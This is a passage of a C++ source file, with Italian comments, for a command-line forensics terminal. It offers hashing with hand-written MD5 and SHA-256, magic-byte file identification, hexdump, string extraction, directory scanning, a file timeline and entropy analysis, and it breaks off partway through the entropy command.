/*
 * =========================================================
 *   FORENSIC TERMINAL v1.0 — Strumento di Analisi Forense
 *   Scritto interamente in C++ standard (C++17)
 *   Compilazione: g++ -std=c++17 -O2 -o forensic forensic_terminal.cpp
 * =========================================================
 */

#include <iostream>
#include <fstream>
#include <sstream>
#include <string>
#include <vector>
#include <map>
#include <set>
#include <algorithm>
#include <functional>
#include <iomanip>
#include <chrono>
#include <ctime>
#include <cstring>
#include <cassert>
#include <stdexcept>
#include <cmath>

// POSIX headers (Linux/macOS)
#include <sys/stat.h>
#include <sys/types.h>
#include <dirent.h>
#include <unistd.h>
#include <pwd.h>
#include <grp.h>

// ─────────────────────────────────────────────
//  COLORI ANSI
// ─────────────────────────────────────────────
#define NEXUS_COLOR_DEFINED
namespace Color {
    const std::string RESET   = "\033[0m";
    const std::string BOLD    = "\033[1m";
    const std::string RED     = "\033[31m";
    const std::string GREEN   = "\033[32m";
    const std::string YELLOW  = "\033[33m";
    const std::string BLUE    = "\033[34m";
    const std::string MAGENTA = "\033[35m";
    const std::string CYAN    = "\033[36m";
    const std::string WHITE   = "\033[37m";
    const std::string BRED    = "\033[1;31m";
    const std::string BGREEN  = "\033[1;32m";
    const std::string BYELLOW = "\033[1;33m";
    const std::string BCYAN   = "\033[1;36m";
    const std::string BWHITE  = "\033[1;37m";
    const std::string DIM     = "\033[2m";
    const std::string BG_RED  = "\033[41m";
    const std::string BG_DARK = "\033[40m";
}

// ─────────────────────────────────────────────
//  UTILITY: stampa banner
// ─────────────────────────────────────────────
void printBanner() {
    std::cout << Color::BRED <<
R"(
  ███╗   ██╗███████╗██╗  ██╗██╗   ██╗███████╗
  ████╗  ██║██╔════╝╚██╗██╔╝██║   ██║██╔════╝
  ██╔██╗ ██║█████╗   ╚███╔╝ ██║   ██║███████╗
  ██║╚██╗██║██╔══╝   ██╔██╗ ██║   ██║╚════██║
  ██║ ╚████║███████╗██╔╝ ██╗╚██████╔╝███████║
  ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝
)" << Color::RESET;
    std::cout << Color::DIM
              << "  ─────────────────────────────────────────────────────────────────────\n"
              << "   v1.0  |  Digital Forensics Tool  |  Solo C++17  |  POSIX\n"
              << "  ─────────────────────────────────────────────────────────────────────\n"
              << Color::RESET << "\n";
}

// ─────────────────────────────────────────────
//  UTILITY: helper generici
// ─────────────────────────────────────────────
std::string toLower(std::string s) {
    std::transform(s.begin(), s.end(), s.begin(), ::tolower);
    return s;
}

std::string trim(const std::string& s) {
    size_t start = s.find_first_not_of(" \t\r\n");
    size_t end   = s.find_last_not_of(" \t\r\n");
    return (start == std::string::npos) ? "" : s.substr(start, end - start + 1);
}

std::vector<std::string> split(const std::string& s, char delim = ' ') {
    std::vector<std::string> tokens;
    std::string tok;
    std::istringstream ss(s);
    while (std::getline(ss, tok, delim))
        if (!tok.empty()) tokens.push_back(tok);
    return tokens;
}

bool fileExists(const std::string& path) {
    struct stat st;
    return stat(path.c_str(), &st) == 0;
}

std::string humanSize(off_t bytes) {
    const char* units[] = {"B","KB","MB","GB","TB"};
    double size = (double)bytes;
    int u = 0;
    while (size >= 1024.0 && u < 4) { size /= 1024.0; ++u; }
    std::ostringstream oss;
    oss << std::fixed << std::setprecision(2) << size << " " << units[u];
    return oss.str();
}

std::string permString(mode_t mode) {
    std::string p = "----------";
    if (S_ISDIR(mode))  p[0] = 'd';
    if (S_ISLNK(mode))  p[0] = 'l';
    if (mode & S_IRUSR) p[1] = 'r';
    if (mode & S_IWUSR) p[2] = 'w';
    if (mode & S_IXUSR) p[3] = 'x';
    if (mode & S_IRGRP) p[4] = 'r';
    if (mode & S_IWGRP) p[5] = 'w';
    if (mode & S_IXGRP) p[6] = 'x';
    if (mode & S_IROTH) p[7] = 'r';
    if (mode & S_IWOTH) p[8] = 'w';
    if (mode & S_IXOTH) p[9] = 'x';
    return p;
}

std::string timeStr(time_t t) {
    char buf[64];
    struct tm* tm_info = localtime(&t);
    strftime(buf, sizeof(buf), "%Y-%m-%d %H:%M:%S", tm_info);
    return std::string(buf);
}

// ─────────────────────────────────────────────
//  HASH: MD5 — implementazione da zero
// ─────────────────────────────────────────────
class MD5 {
    uint32_t s[64] = {
        7,12,17,22,7,12,17,22,7,12,17,22,7,12,17,22,
        5, 9,14,20,5, 9,14,20,5, 9,14,20,5, 9,14,20,
        4,11,16,23,4,11,16,23,4,11,16,23,4,11,16,23,
        6,10,15,21,6,10,15,21,6,10,15,21,6,10,15,21
    };
    uint32_t K[64] = {
        0xd76aa478,0xe8c7b756,0x242070db,0xc1bdceee,0xf57c0faf,0x4787c62a,0xa8304613,0xfd469501,
        0x698098d8,0x8b44f7af,0xffff5bb1,0x895cd7be,0x6b901122,0xfd987193,0xa679438e,0x49b40821,
        0xf61e2562,0xc040b340,0x265e5a51,0xe9b6c7aa,0xd62f105d,0x02441453,0xd8a1e681,0xe7d3fbc8,
        0x21e1cde6,0xc33707d6,0xf4d50d87,0x455a14ed,0xa9e3e905,0xfcefa3f8,0x676f02d9,0x8d2a4c8a,
        0xfffa3942,0x8771f681,0x6d9d6122,0xfde5380c,0xa4beea44,0x4bdecfa9,0xf6bb4b60,0xbebfbc70,
        0x289b7ec6,0xeaa127fa,0xd4ef3085,0x04881d05,0xd9d4d039,0xe6db99e5,0x1fa27cf8,0xc4ac5665,
        0xf4292244,0x432aff97,0xab9423a7,0xfc93a039,0x655b59c3,0x8f0ccc92,0xffeff47d,0x85845dd1,
        0x6fa87e4f,0xfe2ce6e0,0xa3014314,0x4e0811a1,0xf7537e82,0xbd3af235,0x2ad7d2bb,0xeb86d391
    };
    uint32_t a0=0x67452301, b0=0xefcdab89, c0=0x98badcfe, d0=0x10325476;
    uint64_t totalBits = 0;
    std::vector<uint8_t> buffer;

    uint32_t rotl(uint32_t x, uint32_t n) { return (x << n) | (x >> (32-n)); }

    void processBlock(const uint8_t* block) {
        uint32_t M[16];
        for (int i = 0; i < 16; i++) {
            M[i] = (uint32_t)block[i*4]
                 | ((uint32_t)block[i*4+1]<<8)
                 | ((uint32_t)block[i*4+2]<<16)
                 | ((uint32_t)block[i*4+3]<<24);
        }
        uint32_t A=a0,B=b0,C=c0,D=d0,F,g;
        for (uint32_t i=0;i<64;i++) {
            if (i<16)      { F=(B&C)|(~B&D); g=i; }
            else if (i<32) { F=(D&B)|(~D&C); g=(5*i+1)%16; }
            else if (i<48) { F=B^C^D;        g=(3*i+5)%16; }
            else           { F=C^(B|~D);     g=(7*i)%16; }
            F=F+A+K[i]+M[g];
            A=D; D=C; C=B; B=B+rotl(F,s[i]);
        }
        a0+=A; b0+=B; c0+=C; d0+=D;
    }
public:
    void update(const uint8_t* data, size_t len) {
        totalBits += (uint64_t)len * 8;
        for (size_t i=0;i<len;i++) {
            buffer.push_back(data[i]);
            if (buffer.size()==64) {
                processBlock(buffer.data());
                buffer.clear();
            }
        }
    }
    std::string digest() {
        buffer.push_back(0x80);
        while (buffer.size()!=56) {
            if (buffer.size()==64) { processBlock(buffer.data()); buffer.clear(); }
            buffer.push_back(0x00);
        }
        for (int i=0;i<8;i++) buffer.push_back((totalBits>>(i*8))&0xFF);
        processBlock(buffer.data());
        std::ostringstream oss;
        uint32_t vals[4]={a0,b0,c0,d0};
        for (int v=0;v<4;v++)
            for (int b=0;b<4;b++)
                oss<<std::hex<<std::setw(2)<<std::setfill('0')<<((vals[v]>>(b*8))&0xFF);
        return oss.str();
    }
    static std::string hashFile(const std::string& path) {
        std::ifstream f(path, std::ios::binary);
        if (!f) return "(errore lettura)";
        MD5 md5;
        char buf[4096];
        while (f.read(buf, sizeof(buf)) || f.gcount()>0)
            md5.update((uint8_t*)buf, f.gcount());
        return md5.digest();
    }
};

// ─────────────────────────────────────────────
//  HASH: SHA-256 — implementazione da zero
// ─────────────────────────────────────────────
class SHA256 {
    uint32_t h[8] = {
        0x6a09e667,0xbb67ae85,0x3c6ef372,0xa54ff53a,
        0x510e527f,0x9b05688c,0x1f83d9ab,0x5be0cd19
    };
    static const uint32_t K[64];
    uint64_t totalBits = 0;
    std::vector<uint8_t> buffer;

    uint32_t rotr(uint32_t x,int n){return (x>>n)|(x<<(32-n));}
    uint32_t ch(uint32_t x,uint32_t y,uint32_t z){return (x&y)^(~x&z);}
    uint32_t maj(uint32_t x,uint32_t y,uint32_t z){return (x&y)^(x&z)^(y&z);}
    uint32_t sig0(uint32_t x){return rotr(x,2)^rotr(x,13)^rotr(x,22);}
    uint32_t sig1(uint32_t x){return rotr(x,6)^rotr(x,11)^rotr(x,25);}
    uint32_t gam0(uint32_t x){return rotr(x,7)^rotr(x,18)^(x>>3);}
    uint32_t gam1(uint32_t x){return rotr(x,17)^rotr(x,19)^(x>>10);}

    void processBlock(const uint8_t* block) {
        uint32_t w[64];
        for(int i=0;i<16;i++)
            w[i]=((uint32_t)block[i*4]<<24)|((uint32_t)block[i*4+1]<<16)|
                 ((uint32_t)block[i*4+2]<<8)|(uint32_t)block[i*4+3];
        for(int i=16;i<64;i++)
            w[i]=gam1(w[i-2])+w[i-7]+gam0(w[i-15])+w[i-16];
        uint32_t a=h[0],b=h[1],c=h[2],d=h[3],e=h[4],f=h[5],g=h[6],hh=h[7];
        for(int i=0;i<64;i++){
            uint32_t t1=hh+sig1(e)+ch(e,f,g)+K[i]+w[i];
            uint32_t t2=sig0(a)+maj(a,b,c);
            hh=g;g=f;f=e;e=d+t1;d=c;c=b;b=a;a=t1+t2;
        }
        h[0]+=a;h[1]+=b;h[2]+=c;h[3]+=d;h[4]+=e;h[5]+=f;h[6]+=g;h[7]+=hh;
    }
public:
    void update(const uint8_t* data, size_t len) {
        totalBits += (uint64_t)len*8;
        for(size_t i=0;i<len;i++){
            buffer.push_back(data[i]);
            if(buffer.size()==64){processBlock(buffer.data());buffer.clear();}
        }
    }
    std::string digest() {
        buffer.push_back(0x80);
        while(buffer.size()%64!=56){
            if(buffer.size()==64){processBlock(buffer.data());buffer.clear();}
            buffer.push_back(0);
        }
        for(int i=7;i>=0;i--) buffer.push_back((totalBits>>(i*8))&0xFF);
        processBlock(buffer.data());
        std::ostringstream oss;
        for(int i=0;i<8;i++)
            oss<<std::hex<<std::setw(8)<<std::setfill('0')<<h[i];
        return oss.str();
    }
    static std::string hashFile(const std::string& path) {
        std::ifstream f(path, std::ios::binary);
        if(!f) return "(errore lettura)";
        SHA256 sha;
        char buf[4096];
        while(f.read(buf,sizeof(buf))||f.gcount()>0)
            sha.update((uint8_t*)buf,f.gcount());
        return sha.digest();
    }
};
const uint32_t SHA256::K[64]={
    0x428a2f98,0x71374491,0xb5c0fbcf,0xe9b5dba5,0x3956c25b,0x59f111f1,0x923f82a4,0xab1c5ed5,
    0xd807aa98,0x12835b01,0x243185be,0x550c7dc3,0x72be5d74,0x80deb1fe,0x9bdc06a7,0xc19bf174,
    0xe49b69c1,0xefbe4786,0x0fc19dc6,0x240ca1cc,0x2de92c6f,0x4a7484aa,0x5cb0a9dc,0x76f988da,
    0x983e5152,0xa831c66d,0xb00327c8,0xbf597fc7,0xc6e00bf3,0xd5a79147,0x06ca6351,0x14292967,
    0x27b70a85,0x2e1b2138,0x4d2c6dfc,0x53380d13,0x650a7354,0x766a0abb,0x81c2c92e,0x92722c85,
    0xa2bfe8a1,0xa81a664b,0xc24b8b70,0xc76c51a3,0xd192e819,0xd6990624,0xf40e3585,0x106aa070,
    0x19a4c116,0x1e376c08,0x2748774c,0x34b0bcb5,0x391c0cb3,0x4ed8aa4a,0x5b9cca4f,0x682e6ff3,
    0x748f82ee,0x78a5636f,0x84c87814,0x8cc70208,0x90befffa,0xa4506ceb,0xbef9a3f7,0xc67178f2
};

// ─────────────────────────────────────────────
//  FIRME MAGICHE (magic bytes)
// ─────────────────────────────────────────────
struct MagicSig {
    std::vector<uint8_t> bytes;
    size_t offset;
    std::string description;
    std::string extension;
};

std::vector<MagicSig> MAGIC_SIGNATURES = {
    {{0xFF,0xD8,0xFF},              0, "JPEG Image",              ".jpg"},
    {{0x89,0x50,0x4E,0x47},         0, "PNG Image",               ".png"},
    {{0x47,0x49,0x46,0x38},         0, "GIF Image",               ".gif"},
    {{0x42,0x4D},                   0, "BMP Image",               ".bmp"},
    {{0x25,0x50,0x44,0x46},         0, "PDF Document",            ".pdf"},
    {{0x50,0x4B,0x03,0x04},         0, "ZIP Archive",             ".zip"},
    {{0x52,0x61,0x72,0x21},         0, "RAR Archive",             ".rar"},
    {{0x7F,0x45,0x4C,0x46},         0, "ELF Executable (Linux)",  ".elf"},
    {{0x4D,0x5A},                   0, "PE Executable (Windows)",  ".exe"},
    {{0xCA,0xFE,0xBA,0xBE},         0, "Java Class File",         ".class"},
    {{0x1F,0x8B},                   0, "GZIP Archive",            ".gz"},
    {{0xFD,0x37,0x7A,0x58,0x5A},    0, "XZ Archive",              ".xz"},
    {{0x42,0x5A,0x68},              0, "BZip2 Archive",           ".bz2"},
    {{0x37,0x7A,0xBC,0xAF,0x27,0x1C},0,"7-Zip Archive",          ".7z"},
    {{0x4F,0x67,0x67,0x53},         0, "OGG Audio",               ".ogg"},
    {{0x49,0x44,0x33},              0, "MP3 Audio (ID3)",         ".mp3"},
    {{0xFF,0xFB},                   0, "MP3 Audio",               ".mp3"},
    {{0x66,0x74,0x79,0x70},         4, "MP4 Video",               ".mp4"},
    {{0x52,0x49,0x46,0x46},         0, "WAV/AVI (RIFF)",         ".riff"},
    {{0xD0,0xCF,0x11,0xE0},         0, "MS Office (OLE)",         ".doc/.xls"},
    {{0x50,0x4B,0x03,0x04,0x14,0x00,0x06,0x00}, 0, "DOCX/XLSX/PPTX",".docx"},
    {{0x53,0x51,0x4C,0x69,0x74,0x65}, 0, "SQLite Database",      ".db"},
    {{0x00,0x01,0x00,0x00,0x00},    0, "TrueType Font",           ".ttf"},
    {{0x77,0x4F,0x46,0x46},         0, "WOFF Font",               ".woff"},
    {{0x23,0x21},                   0, "Script (shebang)",        ".sh/.py"},
    {{0x7B},                        0, "JSON / Text (starts {)",  ".json"},
    {{0xEF,0xBB,0xBF},              0, "UTF-8 BOM Text",          ".txt"},
    {{0xFF,0xFE},                   0, "UTF-16 LE BOM",           ".txt"},
    {{0xFE,0xFF},                   0, "UTF-16 BE BOM",           ".txt"},
};

std::string detectFileType(const std::string& path) {
    std::ifstream f(path, std::ios::binary);
    if (!f) return "Impossibile aprire il file";
    uint8_t header[32] = {0};
    f.read((char*)header, sizeof(header));

    for (auto& sig : MAGIC_SIGNATURES) {
        if (sig.offset + sig.bytes.size() > sizeof(header)) continue;
        bool match = true;
        for (size_t i = 0; i < sig.bytes.size(); i++) {
            if (header[sig.offset + i] != sig.bytes[i]) { match = false; break; }
        }
        if (match) return sig.description + "  " + Color::DIM + "[" + sig.extension + "]" + Color::RESET;
    }
    // Controlla se è testo ASCII
    bool isText = true;
    for (int i = 0; i < 32 && i < (int)f.gcount(); i++)
        if (header[i] != '\n' && header[i] != '\r' && header[i] != '\t' &&
            (header[i] < 32 || header[i] > 126)) { isText = false; break; }
    return isText ? "Text/ASCII File  [.txt]" : "Unknown / Binary Data";
}

// ─────────────────────────────────────────────
//  CMD: hash
// ─────────────────────────────────────────────
void cmdHash(const std::vector<std::string>& args) {
    if (args.size() < 2) {
        std::cout << Color::YELLOW << "Uso: hash <file> [md5|sha256|all]\n" << Color::RESET;
        return;
    }
    std::string path = args[1];
    std::string mode = (args.size() >= 3) ? toLower(args[2]) : "all";
    if (!fileExists(path)) { std::cout << Color::RED << "File non trovato: " << path << "\n" << Color::RESET; return; }

    std::cout << Color::CYAN << "\n  📂 File: " << Color::BWHITE << path << Color::RESET << "\n";
    std::cout << Color::DIM << "  ─────────────────────────────────────────────\n" << Color::RESET;

    if (mode == "md5" || mode == "all") {
        std::cout << Color::YELLOW << "  MD5    : " << Color::GREEN << MD5::hashFile(path) << Color::RESET << "\n";
    }
    if (mode == "sha256" || mode == "all") {
        std::cout << Color::YELLOW << "  SHA-256: " << Color::GREEN << SHA256::hashFile(path) << Color::RESET << "\n";
    }
    std::cout << "\n";
}

// ─────────────────────────────────────────────
//  CMD: fileinfo
// ─────────────────────────────────────────────
void cmdFileInfo(const std::vector<std::string>& args) {
    if (args.size() < 2) { std::cout << Color::YELLOW << "Uso: fileinfo <file>\n" << Color::RESET; return; }
    std::string path = args[1];
    struct stat st;
    if (stat(path.c_str(), &st) != 0) { std::cout << Color::RED << "Impossibile accedere a: " << path << "\n" << Color::RESET; return; }

    auto pw  = getpwuid(st.st_uid);
    auto grp = getgrgid(st.st_gid);

    std::cout << Color::CYAN << "\n  📋 INFORMAZIONI FILE\n" << Color::RESET;
    std::cout << Color::DIM << "  ─────────────────────────────────────────────────────────\n" << Color::RESET;
    std::cout << Color::YELLOW << "  Percorso   : " << Color::WHITE << path << "\n";
    std::cout << Color::YELLOW << "  Tipo       : " << Color::WHITE << detectFileType(path) << "\n";
    std::cout << Color::YELLOW << "  Dimensione : " << Color::WHITE << st.st_size << " bytes ("
              << humanSize(st.st_size) << ")\n";
    std::cout << Color::YELLOW << "  Permessi   : " << Color::WHITE << permString(st.st_mode)
              << "  (oct: " << std::oct << (st.st_mode & 07777) << std::dec << ")\n";
    std::cout << Color::YELLOW << "  Proprietario: " << Color::WHITE
              << (pw  ? pw->pw_name  : std::to_string(st.st_uid)) << " (uid=" << st.st_uid << ")\n";
    std::cout << Color::YELLOW << "  Gruppo     : " << Color::WHITE
              << (grp ? grp->gr_name : std::to_string(st.st_gid)) << " (gid=" << st.st_gid << ")\n";
    std::cout << Color::YELLOW << "  Inode      : " << Color::WHITE << st.st_ino << "\n";
    std::cout << Color::YELLOW << "  Hard links : " << Color::WHITE << st.st_nlink << "\n";
    std::cout << Color::YELLOW << "  Blocchi    : " << Color::WHITE << st.st_blocks << " x 512B\n";
    std::cout << Color::YELLOW << "  Accesso    : " << Color::WHITE << timeStr(st.st_atime) << "\n";
    std::cout << Color::YELLOW << "  Modifica   : " << Color::WHITE << timeStr(st.st_mtime) << "\n";
    std::cout << Color::YELLOW << "  Cambio inode: " << Color::WHITE << timeStr(st.st_ctime) << "\n";
    std::cout << Color::RESET << "\n";
}

// ─────────────────────────────────────────────
//  CMD: hexdump
// ─────────────────────────────────────────────
void cmdHexdump(const std::vector<std::string>& args) {
    if (args.size() < 2) { std::cout << Color::YELLOW << "Uso: hexdump <file> [bytes_limit]\n" << Color::RESET; return; }
    std::string path = args[1];
    size_t limit = (args.size() >= 3) ? std::stoul(args[2]) : 512;

    std::ifstream f(path, std::ios::binary);
    if (!f) { std::cout << Color::RED << "File non trovato: " << path << "\n" << Color::RESET; return; }

    std::cout << Color::CYAN << "\n  🔍 HEX DUMP: " << path
              << Color::DIM << "  (max " << limit << " bytes)\n" << Color::RESET;
    std::cout << Color::DIM << "  Offset     00 01 02 03 04 05 06 07  08 09 0A 0B 0C 0D 0E 0F  │ ASCII\n";
    std::cout << "  ─────────────────────────────────────────────────────────────────\n" << Color::RESET;

    std::vector<uint8_t> buf(limit);
    f.read((char*)buf.data(), limit);
    size_t n = f.gcount();

    for (size_t i = 0; i < n; i += 16) {
        std::cout << Color::DIM << "  " << std::hex << std::setw(8) << std::setfill('0') << i << "   " << Color::RESET;
        for (size_t j = 0; j < 16; j++) {
            if (i+j < n) {
                uint8_t byte = buf[i+j];
                if (byte == 0x00)           std::cout << Color::DIM;
                else if (byte < 0x20)       std::cout << Color::YELLOW;
                else if (byte >= 0x20 && byte <= 0x7E) std::cout << Color::WHITE;
                else                        std::cout << Color::MAGENTA;
                std::cout << std::hex << std::setw(2) << std::setfill('0') << (int)byte << Color::RESET << " ";
            } else {
                std::cout << "   ";
            }
            if (j == 7) std::cout << " ";
        }
        std::cout << Color::DIM << " │ " << Color::RESET;
        for (size_t j = 0; j < 16 && i+j < n; j++) {
            char c = (char)buf[i+j];
            if (c >= 32 && c <= 126) std::cout << Color::GREEN << c;
            else                     std::cout << Color::DIM << ".";
            std::cout << Color::RESET;
        }
        std::cout << "\n";
    }
    std::cout << std::dec << Color::DIM << "\n  Totale: " << n << " bytes letti\n" << Color::RESET << "\n";
}

// ─────────────────────────────────────────────
//  CMD: strings — estrai stringhe leggibili
// ─────────────────────────────────────────────
void cmdStrings(const std::vector<std::string>& args) {
    if (args.size() < 2) { std::cout << Color::YELLOW << "Uso: strings <file> [minlen] [pattern]\n" << Color::RESET; return; }
    std::string path = args[1];
    size_t minLen = (args.size() >= 3) ? std::stoul(args[2]) : 4;
    std::string pattern = (args.size() >= 4) ? toLower(args[3]) : "";

    std::ifstream f(path, std::ios::binary);
    if (!f) { std::cout << Color::RED << "File non trovato: " << path << "\n" << Color::RESET; return; }

    std::cout << Color::CYAN << "\n  📝 ESTRAZIONE STRINGHE: " << path
              << Color::DIM << "  (minlen=" << minLen << ")\n" << Color::RESET;
    std::cout << Color::DIM << "  ─────────────────────────────────\n" << Color::RESET;

    std::string cur;
    size_t offset = 0, lineOff = 0;
    char c;
    int found = 0;
    while (f.get(c)) {
        if (c >= 32 && c <= 126) {
            if (cur.empty()) lineOff = offset;
            cur += c;
        } else {
            if (cur.size() >= minLen) {
                std::string low = toLower(cur);
                if (pattern.empty() || low.find(pattern) != std::string::npos) {
                    std::cout << Color::DIM << "  0x" << std::hex << std::setw(8)
                              << std::setfill('0') << lineOff << std::dec << "  " << Color::RESET;
                    // Evidenzia pattern se presente
                    if (!pattern.empty()) {
                        size_t pos = low.find(pattern);
                        std::cout << cur.substr(0, pos)
                                  << Color::BRED << cur.substr(pos, pattern.size()) << Color::RESET
                                  << cur.substr(pos + pattern.size()) << "\n";
                    } else {
                        std::cout << Color::GREEN << cur << Color::RESET << "\n";
                    }
                    found++;
                }
            }
            cur.clear();
        }
        offset++;
    }
    std::cout << Color::YELLOW << "\n  Stringhe trovate: " << found << Color::RESET << "\n\n";
}

// ─────────────────────────────────────────────
//  CMD: scan — scansione ricorsiva directory
// ─────────────────────────────────────────────
struct FileEntry {
    std::string path;
    off_t size;
    time_t mtime;
    mode_t mode;
};

void scanDir(const std::string& dir, std::vector<FileEntry>& results,
             const std::string& extFilter, bool recursive, int depth=0) {
    DIR* d = opendir(dir.c_str());
    if (!d) return;
    struct dirent* entry;
    while ((entry = readdir(d)) != nullptr) {
        std::string name = entry->d_name;
        if (name == "." || name == "..") continue;
        std::string full = dir + "/" + name;
        struct stat st;
        if (stat(full.c_str(), &st) != 0) continue;
        if (S_ISDIR(st.st_mode)) {
            if (recursive) scanDir(full, results, extFilter, true, depth+1);
        } else {
            if (!extFilter.empty()) {
                std::string ext;
                auto dot = name.rfind('.');
                if (dot != std::string::npos) ext = toLower(name.substr(dot));
                if (ext != extFilter) continue;
            }
            results.push_back({full, st.st_size, st.st_mtime, st.st_mode});
        }
    }
    closedir(d);
}

void cmdScan(const std::vector<std::string>& args) {
    if (args.size() < 2) { std::cout << Color::YELLOW << "Uso: scan <dir> [-r] [-e .ext] [-s (sort size)] [-t (sort time)]\n" << Color::RESET; return; }
    std::string dir = args[1];
    bool recursive = false;
    std::string extFilter;
    bool sortSize = false, sortTime = false;
    for (size_t i = 2; i < args.size(); i++) {
        if (args[i]=="-r") recursive=true;
        else if (args[i]=="-e" && i+1<args.size()) extFilter=toLower(args[++i]);
        else if (args[i]=="-s") sortSize=true;
        else if (args[i]=="-t") sortTime=true;
    }

    std::vector<FileEntry> results;
    scanDir(dir, results, extFilter, recursive);

    if (sortSize) std::sort(results.begin(),results.end(),[](const FileEntry& a,const FileEntry& b){return a.size>b.size;});
    if (sortTime) std::sort(results.begin(),results.end(),[](const FileEntry& a,const FileEntry& b){return a.mtime>b.mtime;});

    std::cout << Color::CYAN << "\n  📁 SCANSIONE: " << dir
              << Color::DIM << (recursive?" (ricorsiva)":"") << "\n" << Color::RESET;
    std::cout << Color::DIM << "  " << std::string(70,'-') << "\n";
    std::cout << "  Permessi    Dimensione    Modifica              File\n";
    std::cout << "  " << std::string(70,'-') << "\n" << Color::RESET;

    off_t totalSize = 0;
    for (auto& fe : results) {
        totalSize += fe.size;
        std::string sizeStr = humanSize(fe.size);
        std::cout << Color::GREEN  << "  " << permString(fe.mode)
                  << Color::YELLOW << "  " << std::setw(10) << std::right << sizeStr
                  << Color::DIM    << "  " << timeStr(fe.mtime) << "  "
                  << Color::WHITE  << fe.path << Color::RESET << "\n";
    }
    std::cout << Color::CYAN << "\n  File trovati: " << results.size()
              << "  |  Totale: " << humanSize(totalSize) << Color::RESET << "\n\n";
}

// ─────────────────────────────────────────────
//  CMD: magic — identifica tipo di file
// ─────────────────────────────────────────────
void cmdMagic(const std::vector<std::string>& args) {
    if (args.size() < 2) { std::cout << Color::YELLOW << "Uso: magic <file_o_dir>\n" << Color::RESET; return; }
    std::string path = args[1];

    std::vector<std::string> files;
    struct stat st;
    if (stat(path.c_str(), &st) == 0 && S_ISDIR(st.st_mode)) {
        std::vector<FileEntry> results;
        scanDir(path, results, "", false);
        for (auto& fe : results) files.push_back(fe.path);
    } else {
        files.push_back(path);
    }

    std::cout << Color::CYAN << "\n  🔬 IDENTIFICAZIONE TIPO FILE\n" << Color::RESET;
    std::cout << Color::DIM << "  " << std::string(70,'-') << "\n" << Color::RESET;
    for (auto& fp : files) {
        std::string type = detectFileType(fp);
        std::cout << Color::WHITE << "  " << fp << "\n";
        std::cout << Color::YELLOW << "    → " << type << Color::RESET << "\n";
    }
    std::cout << "\n";
}

// ─────────────────────────────────────────────
//  CMD: grep — cerca pattern in file
// ─────────────────────────────────────────────
void cmdGrep(const std::vector<std::string>& args) {
    if (args.size() < 3) { std::cout << Color::YELLOW << "Uso: grep <pattern> <file> [-i] [-n]\n" << Color::RESET; return; }
    std::string pattern = args[1];
    std::string path    = args[2];
    bool ignoreCase = false, showNum = true;
    for (size_t i=3;i<args.size();i++){
        if(args[i]=="-i") ignoreCase=true;
        if(args[i]=="-n") showNum=false;
    }

    std::ifstream f(path);
    if (!f) { std::cout << Color::RED << "File non trovato: " << path << "\n" << Color::RESET; return; }

    std::cout << Color::CYAN << "\n  🔎 GREP: '" << Color::BRED << pattern << Color::CYAN << "' in " << path << "\n" << Color::RESET;
    std::cout << Color::DIM << "  ─────────────────────────────────────────\n" << Color::RESET;

    std::string line;
    int lineNum = 0, found = 0;
    std::string pat = ignoreCase ? toLower(pattern) : pattern;
    while (std::getline(f, line)) {
        lineNum++;
        std::string cmp = ignoreCase ? toLower(line) : line;
        size_t pos = cmp.find(pat);
        if (pos != std::string::npos) {
            found++;
            if (showNum) std::cout << Color::DIM << "  L" << std::setw(5) << lineNum << "  " << Color::RESET;
            // Evidenzia il match
            size_t last = 0;
            std::string search = ignoreCase ? toLower(line) : line;
            while ((pos = search.find(pat, last)) != std::string::npos) {
                std::cout << line.substr(last, pos-last);
                std::cout << Color::BRED << line.substr(pos, pat.size()) << Color::RESET;
                last = pos + pat.size();
                search = search.substr(0, last);
                break; // solo primo match per semplicità
            }
            std::cout << line.substr(last) << "\n";
        }
    }
    std::cout << Color::YELLOW << "\n  Corrispondenze: " << found << Color::RESET << "\n\n";
}

// ─────────────────────────────────────────────
//  CMD: timeline — ordina file per tempo
// ─────────────────────────────────────────────
void cmdTimeline(const std::vector<std::string>& args) {
    if (args.size() < 2) { std::cout << Color::YELLOW << "Uso: timeline <dir> [-r]\n" << Color::RESET; return; }
    bool recursive = (args.size() >= 3 && args[2]=="-r");
    std::vector<FileEntry> results;
    scanDir(args[1], results, "", recursive);
    std::sort(results.begin(),results.end(),[](const FileEntry& a,const FileEntry& b){return a.mtime<b.mtime;});

    std::cout << Color::CYAN << "\n  🕐 TIMELINE: " << args[1] << "\n" << Color::RESET;
    std::cout << Color::DIM << "  " << std::string(65,'-') << "\n";
    std::cout << "  Timestamp              Dimensione   File\n";
    std::cout << "  " << std::string(65,'-') << "\n" << Color::RESET;
    for (auto& fe : results) {
        std::cout << Color::GREEN  << "  " << timeStr(fe.mtime)
                  << Color::YELLOW << "  " << std::setw(10) << humanSize(fe.size)
                  << Color::WHITE  << "  " << fe.path << Color::RESET << "\n";
    }
    std::cout << "\n";
}

// ─────────────────────────────────────────────
//  CMD: entropy — calcola entropia (rileva cifrati/compressi)
// ─────────────────────────────────────────────
void cmdEntropy(const std::vector<std::string>& args) {
    if (args.size() < 2) { std::cout << Color::YELLOW << "Uso: entropy <file>\n" << Color::RESET; return; }
    std::string path = args[1];
    std::ifstream f(path, std::ios::binary);
    if (!f) { std::cout << Color::RED << "File non trovato: " << path << "\n" << Color::RESET; return; }

    size_t freq[256] = {0};
    size_t total = 0;
    char c;
    while (f.get(c)) { freq[(uint8_t)c]++; total++; }

    double entropy = 0.0;
    for (int i=0;i<256;i++) {
        if (freq[i] > 0) {
            double p = (double)freq[i]/total;
            entropy -= p * log2(p);
        }
    }

    std::string verdict, color;
    if (entropy > 7.5)      { verdict = "⚠️  Alta entropia → probabilmente CIFRATO o COMPRESSO"; color = Color::BRED; }
    else if (entropy > 6.0) { verdict = "⚡ Entropia media → possibile compressione parziale";   color = Color::YELLOW; }
    else if (entropy > 4.0) { verdict = "📄 Entropia normale → dati strutturati/testo";          color = Color::GREEN; }
    else                    { verdict = "📊 Bassa entropia → dati altamente ridondanti";         color = Color::CYAN; }

    std::cout << Color::CYAN << "\n  📊 ANALISI ENTROPIA: " << path << "\n" << Color::RESET;
    std::cout << Color::DIM << "  ─────────────────────────────────────────────\n" << Color::RESET;
    std::cout << Color::YELLOW << "  Byte totali  : " << Color::WHITE << total << "\n";
    std::cout << Color::YELLOW << "  Entropia     : " << Color::WHITE
              << std::fixed << std::setprecision(4) << entropy << " bit/byte  (max: 8.0)\n";

    // Barra visuale
    int bars = (int)(entropy / 8.0 * 40);
    std::cout << Color::YELLOW << "  Livello      : [" << color;
